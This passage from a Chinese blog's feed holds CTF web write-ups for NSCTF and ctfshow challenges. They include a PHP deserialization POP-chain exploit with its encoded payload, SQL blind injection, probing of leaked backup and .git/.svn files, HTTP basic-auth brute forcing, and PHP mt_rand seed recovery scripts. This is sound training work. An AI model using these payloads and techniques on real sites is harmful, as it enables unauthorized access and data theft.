      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSCTF Web方向部分题解</title>
      <link href="/2023/07/20/NSctf/"/>
      <url>/2023/07/20/NSctf/</url>
      
        <content type="html"><![CDATA[<p>第一次参加这种正式的组队赛，<s>被大佬带飞这种事请让我多多体验</s><br><img src="https://img1.imgtp.com/2023/07/24/MkGa1pya.png" alt="最终成绩"><br>在学长的鼓励和帮助下，虽然略有遗憾，不过还是取得了满意的成绩<br><strong>继续沉淀</strong></p><hr><h2 id="bombombom-签到题">bombombom --签到题</h2><p>游戏题，类似4399上的炸弹人<br>应该是js前台调试，查看脚本搜索flag出现条件无果<br>直接手打通关</p><p>苟就完了</p><hr><h2 id="ezpop">ezpop</h2><p>给出php源码，考察php反序列化构造pop链和绕过限制<br>调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ctf::__destruct</span><br><span class="line">↓</span><br><span class="line">Happy::__toString</span><br><span class="line">↓</span><br><span class="line">Game::__get</span><br><span class="line">↓</span><br><span class="line">Game::__call</span><br></pre></td></tr></table></figure><p>三个绕过思路：</p><ol><li>md5值：2023的md5值刚满⾜条件</li><li>php过滤：双写</li><li>随机数检验：利⽤引⽤</li></ol><p>在robots.txt发现flag位置<code>fllllllllllllllllllllllllllllag.php</code></p><blockquote><p>注意，由于存在过滤，还需要将序列化字符串中的变量⻓度数值进⾏修改</p></blockquote><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;maybe you can find something in somewhere&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;str-&gt;des;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;heihei&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;str = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$rand</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$temp</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rand = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;rand === <span class="variable language_">$this</span>-&gt;temp)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|flag/i&quot;</span>, <span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> ;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>=<span class="string">&quot;fllllllllllllllllllllllllllllag.pphphp&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$x</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">des</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;a class&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;<span class="subst">$str</span>&quot;</span>);</span><br></pre></td></tr></table></figure><p>本地运行后构造出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?try_some_num=2023&amp;pop=O%3A3%3A%22Ctf%22%3A3%3A%7Bs%3A4%3A%22file%22%3BO%3A5%3A%22Happy%22%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Game%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A3%3A%22hhh%22%3Bs%3A7%3A%22%00Game%00x%22%3Bs%3A35%3A%22fllllllllllllllllllllllllllllag.pphphp%22%3B%7D%7Ds%3A4%3A%22rand%22%3BN%3Bs%3A4%3A%22temp%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure><hr><h2 id="scorequery">ScoreQuery</h2><p>根据题目描述，是道sql注入<br>通过手测发现闭合是单引号,可以用%23注释<br>fuzz后发现过滤了<br><img src="https://img1.imgtp.com/2023/07/24/FlAAWYxh.png" alt=""><br>正常的布尔盲注就行了,用脚本爆破发现不行<br>只有用bp手打了<br><img src="https://img1.imgtp.com/2023/07/24/W1g3VCSC.png" alt=""></p><p><img src="https://img1.imgtp.com/2023/07/24/XZqzCxuI.png" alt=""><br>发现开始返回长度2485时候回显没有,说明此时位置就是ascii码<br>依次爆破表名字段 flag<br><img src="https://img1.imgtp.com/2023/07/24/UNcCpRuS.png" alt=""><br>将爆破出来的数据丢给chagpt<br><img src="https://img1.imgtp.com/2023/07/24/5EZPlaH3.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-信息打点、爆破</title>
      <link href="/2023/07/16/CTFshow/CTFshow1/"/>
      <url>/2023/07/16/CTFshow/CTFshow1/</url>
      
        <content type="html"><![CDATA[<h1>信息搜集</h1><h2 id="1-web1">1.web1</h2><h3 id="题目描述">题目描述</h3><p><strong>开发注释未及时删除</strong></p><h3 id="解题思路">解题思路</h3><p><code>F12</code>查看源代码获得flag<br><img src="https://img1.imgtp.com/2023/07/16/PapY4seN.png" alt="web1"></p><h2 id="1-web2">1.web2</h2><h3 id="题目描述">题目描述</h3><p><strong>js前台拦截 === 无效操作</strong></p><h3 id="解题思路">解题思路</h3><p>js前台拦截无法查看源代码<br>BP抓包放包得到flag(或使用curl方法)<br><img src="https://img1.imgtp.com/2023/07/16/xQ2fIuFx.png" alt="web2"><br><strong>查看其他师傅WP了解的方法：</strong><br><strong>url前加view-source: 查看源代码</strong><br><strong>直接<code>ctrl+u</code>查看源代码</strong><br><strong>使用爬虫办法，即reaquest.get(未尝试)</strong></p><h2 id="1-web3">1.web3</h2><h3 id="题目描述">题目描述</h3><p><strong>没思路的时候抓个包看看，可能会有意外收获</strong></p><h3 id="解题思路">解题思路</h3><p>源代码并未泄露任何信息，按照hint抓包在响应头中发现flag<br>或F12 -&gt; 网络 -&gt; F5刷新界面 -&gt; 查看响应头<br><img src="https://img1.imgtp.com/2023/07/16/Qnh8d1dO.png" alt="web3"></p><h2 id="1-web4">1.web4</h2><h3 id="题目描述">题目描述</h3><p><strong>总有人把后台地址写入robots，帮黑阔大佬们引路。</strong></p><h3 id="解题思路">解题思路</h3><p><s>一直粘图片实在太累，开始水</s><br>根据提示访问/robots.txt(常用姿势)<br>记录了flag位于/flagishere.txt<br>直接跳转拿到flag</p><h2 id="1-web5">1.web5</h2><h3 id="题目描述">题目描述</h3><p><strong>phps源码泄露有时候能帮上忙</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示是phps文件泄露，phps存放着php源码,可通过尝试访问/index.phps读取<br>其他常见的有linux的备份文件，比如<code>index.php.swp</code>、<code>www.zip</code></p><h2 id="1-web6">1.web6</h2><h3 id="题目描述">题目描述</h3><p><strong>解压源码到当前目录，测试正常，收工</strong></p><h3 id="解题思路">解题思路</h3><p>用dirsearch扫到泄露文件<code>/www.zip</code><br>直接访问解压得到flag路径 <code>//flag in fl000g.txt</code></p><h2 id="7-web7">7.web7</h2><h3 id="题目描述">题目描述</h3><p><strong><code>版本控制</code>很重要，但不要部署到生产环境更重要。</strong></p><h3 id="解题思路">解题思路</h3><p>考察git代码泄露，直接访问url/.git/index.php</p><h2 id="8-web8">8.web8</h2><h3 id="题目描述">题目描述</h3><p><strong><code>版本控制</code>很重要，但不要部署到生产环境更重要。</strong></p><h3 id="解题思路">解题思路</h3><p>考察信息svn泄露,直接访问url/.svn/</p><h2 id="9-web9">9.web9</h2><h3 id="题目描述">题目描述</h3><p><strong>发现网页有个错别字？赶紧在生产环境<code>vim</code>改下，不好，死机了</strong></p><h3 id="解题思路">解题思路</h3><p>考察vim缓存信息泄露，直接访问url/index.php.swp<br>临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>详细说明及其他信息搜集知识可参考<a href="https://blog.csdn.net/a597934448/article/details/105431367">CTFhub-Web技能树之信息泄露</a></p><h2 id="10-web10">10.web10</h2><h3 id="题目描述">题目描述</h3><p><strong><code>cookie</code> 只是一块饼干，不能存放任何隐私数据</strong></p><h3 id="解题思路">解题思路</h3><p>参考cookie，直接抓包，在请求数据包看到flag<br>或F12在网络中查看请求头得到cookie值<br>注{ }通过了url编码  { ===%7B  }===%7D</p><h2 id="11-web11">11.web11</h2><h3 id="题目描述">题目描述</h3><p><strong><code>域名</code>其实也可以隐藏信息，<a href="http://xn--flag-f96g315g.ctfshow.com">比如flag.ctfshow.com</a> 就隐藏了一条信息<br>由于动态更新，txt记录会变<br>最终flag flag{just_seesee}</strong></p><h3 id="解题思路">解题思路</h3><p>通过dns检查查询域名 TXT 记录，一般指为某个主机名或域名设置的说明。<br>查找flag.ctfshow.com域名下的txt记录<br>推荐网站<a href="http://dbcha.com/">域名解析查询</a>  <a href="https://zijian.aliyun.com/">阿里云网站运维检测平台</a></p><h2 id="12-web12">12.web12</h2><h3 id="题目描述">题目描述</h3><p><strong>有时候网站上的公开信息，就是管理员常用密码</strong></p><h3 id="解题思路">解题思路</h3><p>dirsearch扫描或查看/robots.txt发现目录/admin<br>根据提示查看网页，发现最下面有一个特别的number 猜想可能为某个密码<br>登陆后台拿到flag</p><h2 id="13-web13">13.web13</h2><h3 id="题目描述">题目描述</h3><p><strong>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示发现网页中帮助文档，其中泄露登陆后台和账号密码，登陆获得flag<br>注意把your-domain改为靶场地址<br><s>好弱智</s></p><h2 id="14-web14">14.web14</h2><h3 id="题目描述">题目描述</h3><p><strong>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示查看源码 <code>ctrl F</code>搜索editor(编辑器)发现/editor路径<br>找到文件上传可以查看全部路径，首先查看web根目录/var/www/html<br>发现可疑文件夹打开找到flag路径/editor/attached/file/var/www/html/nothinghere/fl000g.txt<br>此为相对路径，仿照源码中/upload下图片<br>访问绝对路径/nothinghere/fl000g.txt</p><h2 id="15-web15">15.web15</h2><h3 id="题目描述">题目描述</h3><p><strong>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</strong></p><h3 id="解题思路">解题思路</h3><p>跳转/admin发现后台登陆<br>按照提示使用邮箱作为密码登陆失败<br>回答密保问题重置密码，社工QQ号IP地址为西安<br>重置密码后登陆获得flag</p><h2 id="16-web16">16.web16</h2><h3 id="题目描述">题目描述</h3><p><strong>对于测试用的<code>探针</code>，使用完毕后要及时删除，可能会造成信息泄露</strong></p><h3 id="解题思路">解题思路</h3><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><h2 id="17-web17">17.web17</h2><h3 id="题目描述">题目描述</h3><p><strong>备份的<code>sql文件</code>会泄露敏感信息</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示备份的sql文件泄露敏感信息<br>常用访问backup.sql(或用dirsearch可以扫到)</p><h2 id="18-web18">18.web18</h2><h3 id="题目描述">题目描述</h3><p><strong>不要着急，休息，休息一会儿，玩101分给你flag</strong></p><h3 id="解题思路">解题思路</h3><p>是我喜欢(❤ ω ❤)的游戏题，玩到101分拿到flag，看这个速度和判定根本不可能<br>查看源代码发现是纯前端的JS脚本控制<br>找到flag的出现条件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;GAMEOVER\n是否从新开始&quot;</span>);</span><br></pre></td></tr></table></figure><p>控制台运行<br><code>alert('\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b')</code><br>弹出提示框到/101.php拿到flag</p><h2 id="19-web19">19.web19</h2><h3 id="题目描述">题目描述</h3><p><strong>密钥什么的，就不要放在前端了</strong></p><h3 id="解题思路">解题思路</h3><p>查看源代码看到注释掉的js脚本（绕过前端直接提交密码哈希大大简化步骤）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$flag=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    $u = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $p = $_POST[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">isset</span>($u) &amp;&amp; <span class="title function_">isset</span>($p))&#123;</span><br><span class="line">        <span class="keyword">if</span>($u===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $p ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>hackbar以POST形式传入u和p以获得flag<br><code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></p><p><strong>未简化版本</strong><br>若隐藏以上JS脚本，我们已知AES加密函数，密文，密钥，偏移量，可解码获得明文<br><s>密码学会不了一点</s><br>直接使用<a href="http://tool.chacuo.net/cryptaes">解密网站</a><br>加密模式：CBC     填充：zeropadding  密钥：0000000372619038<br>偏移量：ilove36dverymuch  输出：hex  字符集：UTF-8<br>密文：a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<br>解出密码：i_want_a_36d_girl 直接登录即可（楽）</p><h2 id="20-web20">20.web20</h2><h3 id="题目描述">题目描述</h3><p><strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤</strong></p><h3 id="解题思路">解题思路</h3><p>打开靶机发现提示asp程序，access数据库<br>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb<br>下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag<br>或使用diesearch扫描到/db目录，进一步扫描也可发现/db/db.mdb文件</p><hr><h1>爆破</h1><h2 id="21-web21">21.web21</h2><h3 id="题目描述">题目描述</h3><p><strong>爆破什么的，都是基操</strong></p><h3 id="解题思路">解题思路</h3><p>本题给出密码本，BP抓包发现采用basic认证，发送到Intruder准备爆破<br>先确定变量位置，发现采用了base64编码<br>设置payload，加载密码本，设置前缀（Prefix）为admin:<br>采用base64-encode<br>注意顺序并取消特殊符号的编码<br>开始爆破找到状态码为200的即为成功，发包得到flag</p><h2 id="22-web22">22.web22</h2><h3 id="题目描述">题目描述</h3><p><strong>域名也可以爆破的，试试爆破这个ctf.show的子域名</strong></p><h3 id="解题思路">解题思路</h3><p>原题中flag所在的子域名应该已经失效<br>主要理解搜集子域名的意义<br>推荐一个<a href="https://scan.javasec.cn/">子域名爆破网站</a></p><h2 id="23-web23">23.web23</h2><h3 id="题目描述">题目描述</h3><p><strong>还爆破？这么多代码，告辞！</strong></p><h3 id="解题思路">解题思路</h3><p>代码审计，直接编写PHP脚本得到token值，源码中php可以直接使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10000</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$i= &#x27;</span>,<span class="variable">$i</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$i= 422</span></span><br><span class="line"><span class="comment">#$i= 1202</span></span><br></pre></td></tr></table></figure><p>GET方式传入token得到flag</p><h2 id="24-web24">24.web24</h2><h3 id="题目描述">题目描述</h3><p><strong>爆个🔨</strong></p><h3 id="解题思路">解题思路</h3><p>代码审计，发现用PHP随机数生成函数且种子固定<br>因此生成的伪随机数固定<br>编写php脚本(注意token错误可能是因为php版本问题)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">#1155388967</span></span><br></pre></td></tr></table></figure><h2 id="25-web25">25.web25</h2><h3 id="题目描述">题目描述</h3><p><strong>爆个🔨，不爆了</strong></p><h3 id="解题思路">解题思路</h3><p>这题需要看懂逻辑(终于有个有意思的了)，先分析以下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$rand = intval($r)-intval(mt_rand());</code>当传入r=0时，可输出生成第一个随机数的负值（因flag随机生成，随机数每次不同）<br>接下来我们要用生成的第一个随机数反推随机数种子<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">随机数种子反推工具</a><br><img src="https://img1.imgtp.com/2023/07/18/39RWHP7H.png" alt="在kali上编译并运行工具"><br>得到随机数种子（不同php版本有差异）<br>接下来编写php脚本验证种子正确性并得到第二、三个随机数之和</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x04a34661</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;  &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#2085542740  2190553804</span></span><br></pre></td></tr></table></figure><p>搞定！payload:?r=2085542740 cookie:token=2190553804</p><h2 id="26-web26">26.web26</h2><h3 id="题目描述">题目描述</h3><p><strong>这个可以爆</strong></p><h3 id="解题思路">解题思路</h3><p>由于出题人底层代码错误，直接连接也可链接到数据库<br>抓包放包可获得flag<br>也可像web21一样爆破，不再赘述</p><h2 id="27-web27">27.web27</h2><h3 id="题目描述">题目描述</h3><p><strong>CTFshow菜鸡学院招生啦！</strong></p><h3 id="解题思路">解题思路</h3><p>该题为一个教务管理系统，但是并不知道学生的学号和密码<br>但下方给出了录取名单 身份证621022********5237中有八位被遮挡<br>思路清晰，要爆破可用的身份证<br>这里要会写身份证检验的脚本，能大大减少爆破的数据量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checkCard</span><span class="params">(<span class="type">int</span> ID[<span class="number">18</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> list[] = &#123; <span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="type">int</span> src[] = &#123; <span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span> 